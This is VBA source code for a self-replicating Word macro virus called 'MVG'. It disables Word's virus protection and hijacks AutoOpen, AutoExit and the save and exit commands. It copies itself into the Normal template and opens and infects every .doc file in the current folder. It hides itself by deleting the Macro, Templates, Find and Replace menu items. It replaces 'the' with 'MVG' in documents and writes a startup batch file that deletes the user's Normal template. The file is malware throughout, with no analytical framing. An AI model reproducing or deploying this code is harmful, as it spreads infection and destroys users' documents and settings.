Attribute VB_Name = "MVG"

Public Skip As Integer


Sub MVG()
On Error Resume Next
Randomize
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.VBE.ActiveVBProject.VBComponents("MVG").Export "c:\MVG.sys"
ActiveDocument.ReadOnlyRecommended = False
check = Int(Rnd * 1000)
If check = 24 Then Call LanMVG
rm = Int(Rnd * 100)
If rm = 99 Then MsgBox Chr(77) + Chr(86) + Chr(71), vbCritical
f9517$ = "c:\windows\startm~1\programs\startup\msfile.bat"
aMVG = GetAttr(NormalTemplate.FullName)
If aMVG = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call zMVG(f9517$)
If aMVG = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call zMVG(f9517$)
If aMVG = vbReadOnly Then GoTo vMVG
If aMVG = vbReadOnly + vbArchive Then GoTo vMVG
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "MVG" Then bMVG = True
Next I
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "MVG" Then cMVG = True
Next I
If bMVG = True And cMVG = False Then Set dMVG = NormalTemplate.VBProject.VBComponents
If bMVG = False And cMVG = True Then Set dMVG = ActiveDocument.VBProject.VBComponents
dMVG.Import "c:\MVG.sys"
If bMVG = False And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If cMVG = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
f12939 = m12129 & c5225 & Int(Rnd * 7393)
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Templates and add-ins...").Delete
vMVG:
End Sub


Sub HelpAbout()    
On Error Resume Next
MsgBox Chr(73) + Chr(78) + Chr(70) + Chr(69) + Chr(67) + Chr(84) + Chr(69) + Chr(68) + Chr(32) + Chr(49) + Chr(57) + Chr(57) + Chr(56) + Chr(32) + Chr(45) + Chr(32) + Chr(50) + Chr(48) + Chr(48) + Chr(48), vbInformation
MsgBox Chr(66) + Chr(89) + Chr(32) + Chr(86) + Chr(73) + Chr(82) + Chr(85) + Chr(83), vbCritical
End Sub


Sub FileNew()
On Error Resume Next
Call MVG
Dialogs(wdDialogFileNew).Show
Skip = 1
Call MVG
End Sub


Sub FileSave()
On Error Resume Next
Call MVG
ActiveDocument.Save
End Sub


Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call MVG
End Sub


Sub FileExit()
On Error Resume Next
Call MVG
If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call MVG
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call MVG
End If
Loop
Application.Quit
End Sub


Sub AutoOpen()
On Error Resume Next
Call MVG
End Sub


Sub AutoExit()
On Error Resume Next
Call MVG
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call MVG
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call MVG
End If
Loop
End Sub


Sub ViewVBCode()
On Error Resume Next
End Sub


Sub LanMVG()
On Error Resume Next
Selection.HomeKey Unit:=wdStory
Selection.Find.ClearFormatting
Selection.Find.Replacement.ClearFormatting
With Selection.Find
.Text = "the"
.Replacement.Text = "MVG"
.Forward = True
.Wrap = wdFindContinue
.Format = False
.MatchCase = False
.MatchWholeWord = True
.MatchAllWordForms = False
End With        
MVGForm.Show
Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete        CommandBars("edit").Controls("Repeat Replace...").Delete        CommandBars("edit").Controls("Replace...").Delete        CommandBars("edit").Controls("Find...").Delete        CommandBars("tools").Controls("Spelling and Grammar...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub


Sub zMVG(strFile As String)
Dim hFile As Long
On Error Resume Next
n$ = NormalTemplate
Part11$ = "attrib -h -r "
snag$ = "c:\progra~1\micros~1\templa~1\"
snag1$ = "c:\progra~1\micros~2\templa~1\"
Part2$ = "del "
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
End Sub